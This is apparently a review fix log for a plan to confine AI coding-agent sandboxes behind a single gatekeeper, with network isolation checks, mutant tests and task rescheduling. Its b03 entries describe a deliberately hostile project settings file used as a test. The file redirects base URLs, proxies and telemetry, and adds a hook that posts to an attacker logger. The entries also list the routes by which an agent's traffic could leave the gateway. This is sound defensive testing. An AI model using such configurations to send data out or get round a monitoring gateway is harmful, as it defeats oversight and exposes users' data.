- `task-23.md:167`, step 10a, item 10 (new). P3 commits a hostile `.claude/settings.json` that points the base URL, the Bedrock door and the proxies at `gw-attacker`, a request-line logger on the sandbox network. A positive control from the sandbox proves the listener is reachable. The item is observed only when the reply comes through the gatekeeper and the logger saw the control alone. Any other line is a blocker, and its shape names the door. Step 3 no longer sets `BASE_URL` or `NETWORK` (`:60`), and item 2 expects the pinned URL.
- Skeleton `:248` (14), `:250` (15) and `:274` (23, items 9 and 10). `task-25.md:84` closes the gap in the plan, and U21 (`:127`) carries what stays unverified.
- Deliberately unchanged: `http://gatekeeper:4000` in tasks 03, 07, 08, 11 and 12. There it is a unit-test fixture (a valid base-URL shape, an `httptest` target), not a deployed value.

**I-6 (Important), a sandbox sees the gatekeeper alone.**
- `task-17.md:5`: two networks. `panacea-app-gateway`, the sandbox network, holds the gatekeeper alone, with the alias. `panacea-app-gateway-backend` is `internal: true` (`:259-261`) and holds the gatekeeper, keysmith, LiteLLM, Postgres and both fakes. Two small bridges carry what an internal network cannot. `panacea-app-gateway-published` (`:262`) holds keysmith alone, so its loopback port publishes (`:348`). `panacea-app-gateway-egress` (`:398`) is anthropic mode's route out, for LiteLLM alone. The test-database override puts Postgres on `published` (`:523`), never on the sandbox network. The interfaces are at `:33-35`.
- `task-17.md:161-188`, `compose_test.sh`: the names, `internal: true`, "the sandbox network holds the gatekeeper alone", the review's rule "`litellm` and `postgres` are not on the sandbox network", every service's exact networks, and the alias. `:130` checks the testdb override. That makes 8 → 13 checks, with five proven non-vacuous (`:553`). Step 7 (`:595`, `:602`) shows `litellm`, `keysmith`, `postgres` and a fake failing to resolve from the sandbox network. The residual at the old `:579` is replaced (`:658`), and `:659` states the Docker behaviours as **UNVERIFIED**.
- `task-15.md:1588`: `cmd/api` refuses any `_NETWORK` but `panacea-app-gateway`, because task 17's other networks hold LiteLLM (a config row).
- `task-18.md:43` and `:568`: the throwaway probe LiteLLM joins `panacea-app-gateway-backend`.
- `task-23.md:139`: item 9 now expects the wall. Each backend name gives curl exit `6` (unresolvable), the alias answers, and the sandbox has exactly one network. A resolving name is a finding against task 17. Gap 2 is marked resolved (`:286`).
- Skeleton P6-D1 (`:65`), the file map (`:143`) and task 17's summary (`:256`). `task-25.md:83` is marked closed in the plan, and U22 (`:128`) covers the Docker behaviours.

**Verified in scratch, not in the repository** (`$TEMP/…/scratchpad/p6/b03`):
- Task 14's `fragment_test.go` and fragment JSON, extracted from the part by `awk` and run in a throwaway module, give five of five passes. The fragment is 13 lines. Each of the three new fragment mutants (delete the base URL, append `/v1/messages`, set Bedrock to `"1"`) fails `TestTheFragmentIsExactlyTheGatewayKeys` and `TestTheFragmentPinsTheGatekeeperAsTheOnlyEndpoint`, and nothing else. `go test`, `go 1.23`.
- Task 17's network checker, copied verbatim into Python, was run against synthetic `docker compose config` shapes, 7 of 7 as intended: the new fake and anthropic shapes pass; the pre-I-6 shape fails with 13 errors; `litellm` on `gateway`, `internal` deleted, the alias deleted and `egress` outside anthropic mode each fail. That the real `compose config --format json` renders these shapes (a list as `{name: null}`, with `aliases` inside the mapping) is **UNVERIFIED**. Step 6's five proofs settle it.
- Task 15's code, task 19's `fail` guard and task 23's steps were reasoned over the plan's text, not run, because none of these packages or charts exists on this branch yet.

**Mutants I expected to survive:** (1) deleting the checker's explicit "`litellm` and `postgres` are not on the sandbox network" loop, and (2) deleting its "the sandbox network holds the gatekeeper alone" check. Both survive as test deletions: with either one gone, every bad shape still fails, through the exact per-service network table. They are redundant rather than equivalent. They stay because they are the review's rule, stated so that a failure reads as the cause. The table is the check that bites.

**Owner questions:** none new. **Deferred:** none. The residual is stated, not deferred: a key the fragment does not pin stays the repository's, and stopping a project's `env` from applying at all is seam S6.6's (task 14, "does not claim").

## Fix batch b03, round 2 (re-review `plan-rereview-b03-1.md`), 2026-09-26

Line numbers are as of commit `891ce80`. Commits: `10ef988` (task 14), `c99025e` (task 23), `a4f4015` (tasks 17 and 25), `7dc4f16` (task 15), `55f0888` and `891ce80` (skeleton). The heading of I-4 above (`:200`) no longer claims every route is closed.

**R-1 (Important): telemetry export and project hooks were routes off the gateway.** Fixed with the root-cause option (pin both), not by naming them open.
- `task-14.md:24`, decision (e): `CLAUDE_CODE_ENABLE_TELEMETRY` = `"0"`, so a project's `OTEL_*` keys are inert. `:25`: top-level `allowManagedHooksOnly` = `true`, as `05-design.md:246` and `:837` already ask of managed files; KPMG's tenant sets it `false` (`03-techniques.md:84`), so the merge order is **UNVERIFIED** and S6.6's base file must set `true` itself (gap 6, `:548`). Fragment JSON `:448`, `:452` (15 lines). Exact-keys test `:234`, pin test `:249-260`, mutants 7 → 9 (`:493`, `:504-505`).
- `task-14.md:537`: "does not claim" now names what stays open, which are project MCP servers and plugins (S6.6), unpinned `env` keys, and the agent's own Bash tool (the network's job). `:539`: `allowManagedHooksOnly` moved out of the base-file list.
- `task-23.md:188-201`: the hostile file adds the telemetry switch and the four OTEL keys the re-review named (plus the protocol and a one-second export interval, so an export is plain HTTP and prompt), and a `UserPromptSubmit` hook posting to `gw-attacker`. `:210` records `/hooks`. `:220` names `POST /v1/logs` and `POST /hook-S4` as doors.
- `task-25.md:84` (the I-4 row lists what stays open), U21 `:127`. Skeleton 14 summary `:248`, S6.6 `:291`.

**R-2 (Important): item 10 could pass untested, and an error with a clean log was misread.**
- (a) `task-23.md:195`, `PANACEA_P3_MARKER`, an unpinned key. `:210`: `! printenv PANACEA_P3_MARKER` must print `loaded` before item 10 can be observed; otherwise the item is **not observed**. The re-review's fix said to use "the agent's Bash tool". The fake upstream never asks for a tool, so the model cannot be told to run it. The `!` prefix runs the line through the same Bash tool with no model call (**UNVERIFIED**, training knowledge). `:220` and the table row `:274` require the marker.
- (b) `task-23.md:188`, `AWS_REGION`. `:220`: "error, clean log" is a **blocker**. The one-key-at-a-time re-run names the key whose removal restores the reply, and that is the open door. `:222`: the hook and telemetry halves rest on the marker, and a `/hooks` listing that omits the hook makes the hook half partly observed.
- Skeleton 23 summary `:274`.

**M-1:** `task-17.md:595` prints curl's exit status. `:602` expects `exit 6` on every backend name, and says why `000` could not fail. `:659` restated.
**M-2:** skeleton P6-D2 `:66` and `:92` now say "never enables (pinned `"0"`)". S6.4 `:289` needs a per-route fragment, so the pin, the `BEDROCK_BASE_URL` ban and the exact-keys test change with it. Task 14 is added to its tasks. The launch-environment bans (`task-15.md:363`, `task-24.md:186`, `:532`) are consistent and unchanged.
**M-3:** skeleton P8-1 `:306` names the one base URL, never another.
**M-4:** `task-17.md:660` "does not claim": membership is the wall, and `host.docker.internal` may reach keysmith `:4100` and the testdb Postgres `:55432`. LiteLLM publishes nothing. `task-23.md:131` probes `host.docker.internal:4100`, and `:139` records it without judging item 9. U22 is at `task-25.md:128`.
**M-5:** (a) `task-15.md:1697`, a mutant for the `NETWORK` refusal, mutants 11 → 12 (`:1682`, `:1718`). (b) `task-14.md:23`: a future proxy's `NO_PROXY` hosts go in the fragment, never in the launch environment.

**Verified in scratch** (`$TEMP/…/scratchpad/p6/b03/frag2.sh`, `frag2.out`): task 14's `fragment_test.go` and JSON, extracted from the part, pass five of five, and the fragment is 15 lines. Both R-1 mutants (telemetry `"1"`, hooks line deleted) and the old Bedrock mutant fail `TestTheFragmentIsExactlyTheGatewayKeys` and `TestTheFragmentPinsTheGatekeeperAsTheOnlyEndpoint`, and nothing else. **Expected survivors, named before the run:** (S1) `allowManagedHooksOnly` as the string `"true"`, and (S2) the telemetry line deleted. Both were killed by the same two tests. S1 dies because `json.Unmarshal` leaves the bool false, and S2 dies because the missing key reads `""`. Task 17's step 7, task 23's item 10 and the skeleton were reasoned over the plan text only, not run.

**Owner questions:** none new. `allowManagedHooksOnly` in the fragment follows `05-design.md:246`, which is already the design. **Deferred:** none.

## Fix batch b04 (I-10, I-1), 2026-09-26

Line numbers are as of commit `b448221`. Commits: `dc8f57e` (task 08), `42e00bb` (task 15 and the skeleton), `b448221` (tasks 17, 19, 21, 23, 25).

**I-10 (Important): tasks 08 and 15 were larger than their hours.** Both split as the review asked. One figure differs: the review's "+~2 h" does not match its own halves (1.5 h + 2 h − 3 h = +0.5 h per task), so the total rises by **1 h**, 61 → 62 h.
- **Task 08 → 08a + 08b.** `task-08.md:7-14` is the split table. **08a** (1.5 h) holds caller authentication: `callerauth.go` (`:935`), `calleroidc.go` (`:1187`), six tests, four mutants. **08b** (2 h) holds the API, config and start: eleven tests (17 in the package), nine mutants. 08a depends on 03 and env 17 step 0 only; its code reads nothing of task 07. One more file was needed. `loadOIDC`, `commaList`, `callerOf` and `ownerMayAct` read `envPrefix` and `apiDeps`, so they moved from `calleroidc.go` into a new **08b** `owner.go` (`:1296`), and `owner_test.go` holds their two tests (`:836`). The `tokenAuth` fake moved into 08a's `calleroidc_test.go` (`:751`). A `package main` with no `func main` fails `go build`, so 08a ships a placeholder `main.go` that exits `2` (`:1279`); 08b replaces it. Every step names the half it belongs to: preflight `:78-104`, red `:923-929`, green `:2051-2058` (the exit status is read from a file), the mutant table with a task column `:2060-2078`, build and refusal `:2080-2089`, the two commits `:2091-2112`, acceptance `:2114`. Gap 7 (`:2133`) names 08a as the half that waits on `oidcauth`.
- **Task 15 → 15a + 15b.** The split table is `task-15.md:7-14`. **15a** (1.5 h) is `gatewayclient` alone: 13 tests and nine mutants, depending on 03 and 14. **15b** (2 h) is `backend` + `dockerbe` + `katabe`, `registry`, `api` and `cmd/api`: three mutants and phase 2's tests as the regression gate, depending on 13 and 15a. `:14` records that 15a imports nothing of task 08 and tests against a fake keysmith, as task 12 already does (`task-12.md:384`). So 15a no longer waits for 08b. The price is stated: the real client and the real keysmith first meet in task 23 (`task-23.md:11`). The steps are marked the same way: files `:27-38`, red `:770-790`, green `:1692-1710`, mutants `:1712-1729`, vet `:1731-1740`, commits `:1742-1760`, acceptance `:1762`.
- **Skeleton.** File map `:131-132` and `:140-142`. Task table `:168-169` and `:176-177`, whose dependents 17, 19, 21 and 23 now name 08b or 15b (`:179-185`). 08b also depends on 02, 09 and 13, which its wiring reads (`task-08.md:3`); the old row listed 07 alone. Total and critical path `:189`, waves `:193-202`, summaries `:235` and `:253`, the dependents' summaries `:259`, `:265`, `:271` and `:277`, seams S6.3 and S6.5 `:291` and `:293`, and the master-key row `:101` (08b).
- **Critical path: 25 h → 23 h.** It is now 01 → 03 → 05 → 10 → 11 → 12 → 17 → 18 → 23 → 25. The old path ran through 08 → 15 → 21 → 22, and splitting 15a off 08 broke that chain. The skeleton line `:189` states the slack: 08b has 2.5 h, the 21 → 22 branch 4.5 h, and 08a 7 h, which covers its cross-tree wait.
- **Restatements elsewhere.** Only the interface lines were changed: `task-17.md:41-42`, `task-19.md:35`, `task-21.md:28`, `task-23.md:11`, `task-25.md:80-81` and `:109`. Descriptive "task 08's X" and "task 15's X" references are unchanged, because they still resolve to the part files, which hold both halves.

**I-1 (Important): wave 6 ran task 19 beside its dependency 12.** Fixed. Rather than moving one number, the waves were recomputed from the task table (`:191`, "recomputed from the table above"). Task 19 is in wave 7 (`:199`), after 12 in wave 6 (`:198`) and before 24 in wave 8 (`:200`). The summary `:265` says so. The recomputation also moved 21 to wave 6 and 22 to wave 7, and put 08a in wave 3, 15a in wave 4, and 08b and 15b in wave 5.

## Fix batch b04, round 2 (re-review `plan-rereview-b04-1.md`), 2026-09-26

Line numbers are as of commit `e254c44`. Commits: `780663c` (B04-1), `e254c44` (B04-2, B04-3 and two of the re-review's notes).

**B04-1 (Important): task 21's by-hand acceptance needed task 17's stack, a wave later.** Fixed by the re-review's root-cause option. 21's acceptance 3 moved into task 23, which already waits on 21 (through 22) and on 17 (through 18). The alternative, adding 17 to 21's dependencies, would have made the path 26 h, so it was not taken. The table, the waves, the 23 h critical path, the 4.5 h slack on 21 → 22 and the claim that the real client and keysmith "first meet in task 23" all stand unchanged.
- `task-21.md:1010`: the acceptance now says no by-hand run is in this task, and why. Its steps 9 and 10 are its whole proof.
- `task-23.md:72-76` (step 4): the unclassified `GET` expects `"effectiveRoute":null`, `"gateway":"on"` and `"usageState":"ok"`. That is 15a's client reading keysmith's `/v1/usage` for the first time.
- `task-23.md:108-111` (step 6): the `PATCH` back to `global` is expected to be `needs_compliance`, and P1 is still `au` afterwards. Item 3's criterion (`:114`) and its record row (`:273`) name the refusal. The new unnumbered row `:281` records step 4.
- `task-23.md:11`: "Consumes" names 21's routes and its moved acceptance.
- Skeleton `:271` (21's summary) and `:277` (23's item 3) say the same.
- Restatement, found by grep: `task-21.md:1016` and `:1017` cited "task 23 step 3" for the raise. The raise is step 6, so both now say step 6.

**B04-2 (Minor): stale citation.** Fixed. `task-15.md:1781` now cites `task-08.md:35`, the usage row.

**B04-3 (Minor): preflight read a test through a pipe.** Fixed. `task-08.md:101` now redirects to `/tmp/ks-08a.txt` and prints `08a exit $?` (expect 0). The stop rule at `:104` names a non-zero exit.

**Re-review notes (pre-existing), two fixed and one left:**
- Duplicate gap 7 in task 08. The second one is now gap 8 (`task-08.md:2134`), and task 07's two citations of it follow (`task-07.md:43`, `:1326`). The first gap 7 (`:2133`) keeps its number, so round 1's map above still resolves.
- Skeleton said a missing master key "exits 1". It now says `2`, phase 2's status for a configuration refusal (`:235`). Task 08's decision (a) (`:56`) and gap 2 (`:2128`) say the conflict is resolved.
- `task-19.md:35` uses task 17's image paths without depending on 17. Left as is: it uses names only, no digests, and 19 and 17 now share wave 7, so it does not block scheduling.
- Still unverified: no phase 6 code exists, so every test and mutant count is a plan figure.
